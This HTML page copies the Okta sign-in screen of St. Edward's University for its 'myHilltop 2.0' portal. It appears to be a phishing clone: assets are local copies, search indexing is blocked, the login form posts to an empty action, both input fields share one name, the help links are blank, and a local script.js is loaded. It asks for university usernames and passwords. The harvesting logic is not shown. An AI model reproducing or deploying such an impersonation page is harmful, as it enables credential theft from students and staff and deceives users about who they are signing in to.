<!DOCTYPE html>
<html lang="en">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <style type="text/css" nonce="">
        .bgStyle {
          background-image: url('./fs0n1clurcwkDvm8z2p7.jpeg')
        }
        .bgStyleIE8 {
          filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='./fs0n1clurcwkDvm8z2p7.jpeg', sizingMethod='scale')
        }
        .copyright a:focus-visible, 
        .privacy-policy a:focus-visible {
          border-radius: 6px;
          outline: rgb(84, 107, 231) solid 1px;
          outline-offset: 2px;
          text-decoration: none !important; 
        }
    </style>
    <title>St. Edward's University - Sign In</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex,nofollow">
    <link href="./okta-sign-in.min.css" type="text/css" rel="stylesheet">
    <link href="./loginpage-theme.e0d37a504604ef874bad26435d62011f.css" rel="stylesheet" type="text/css">
    <link href="./style-sheet" rel="stylesheet" type="text/css">

  </head>
  <body class="auth okta-container bgStyle">

  <div class="content">
    <div class="applogin-banner">
      <div class="applogin-background"></div>
      <div class="applogin-container">
        <h1>
            <span class="applogin-app-title">
              Connecting to</span>
            <div class="applogin-app-logo">
                <img src="./default.6770228fb0dab49a1695ef440a5279bb.png" alt="myHilltop 2.0" class="logo stedwards_myhilltoptest_1"></div>
        </h1>
        <p>Sign in with your account to access myHilltop 2.0</p>
      </div>
    </div>
      <div id="signin-container">
        <main tabindex="-1" id="okta-sign-in" class="auth-container main-container no-beacon" style="">
          <div class="okta-sign-in-header auth-header">
            <h1>
              <img src="./fs0n1clurava9LQJu2p7" class="auth-org-logo" alt="St. Edward&#39;s University logo logo" aria-label="St. Edward&#39;s University logo logo">
            </h1>
            <div data-type="beacon-container" class="beacon-container"></div>
          </div>
          <div class="auth-content">
            <div class="auth-content-inner">
              <div class="siw-main-view identify primary-auth">
                <div class="siw-main-header">
                  <div></div>
                </div>
                <div class="siw-main-body">


                  <form method="POST" action="" id="Login" class="ion-form o-form o-form-edit-mode">
                    <div class="o-form-content o-form-theme clearfix">
                      <h2 class="okta-form-title o-form-head">- - -</h2>
                      <div class="o-form-info-container"></div>
                      <div class="o-form-error-container" role="alert"></div>
                      <div class="o-form-fieldset-container">
                        <!-- input -->
                        <div id="userDiv"  class="o-form-fieldset o-form-label-top" style="display: block;">
                          <div class="okta-form-label o-form-label">
                            <label for="inputUser">Sign in with Username&nbsp;</label>
                          </div>
                          <div data-se="o-form-input-container" class="o-form-input">
                            <span data-se="o-form-input-identifier" class="o-form-input-name-identifier o-form-control okta-form-input-field input-fix">
                              <input type="text" placeholder="someone@stedwards.edu" name="identifier" id="inputUser" value="">
                            </span>
                          </div>
                        </div>
                        <!-- pass -->
                        <div id="passDiv" class="o-form-fieldset o-form-label-top" style="display: block;">
                          <div class="okta-form-label o-form-label">
                            <label for="inputPass">Password&nbsp;</label>
                          </div>
                          <div class="o-form-input">
                            <span class="o-form-input-name-identifier o-form-control okta-form-input-field input-fix">
                              <input type="password" placeholder="" name="identifier" id="inputPass" value="">
                            </span>
                          </div>
                        </div>

                        <div class="o-form-fieldset o-form-label-top">
                          <div class="o-form-input">
                            <span class="o-form-input-name-rememberMe">
                              <div class="custom-checkbox">
                                <input type="checkbox" name="rememberMe">
                                <label for="input36">Keep me signed in</label>
                              </div>
                            </span>
                          </div>
                        </div>
                      </div>
                    </div>
                    <div class="o-form-button-bar">
                      <input class="button button-primary" type="submit" value="Submit">
                    </div>
                  </form>

                </div>
                <div class="siw-main-footer">
                  <div class="auth-footer">
                    <a data-se="unlock" href="" class="link js-unlock">Unlock account?</a>
                    <a data-se="help" href="" class="link js-help">Help</a>
                    <a data-se="custom" href="" class="link js-custom">Set up MFA</a>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </main>
      </div>
    </div>

    <div class="footer">
      <div class="footer-container clearfix">
        <p class="copyright">Powered by <a href="https://www.okta.com/?internal_link=wic_login" class="inline-block notranslate">Okta</a></p>
            <p class="privacy-policy"><a href="https://identity.stedwards.edu/privacy" target="_blank" class="inline-block margin-l-10">Privacy Policy</a></p>
        </div>
    </div>
    <script src="./script.js"></script>
  </body>
</html>
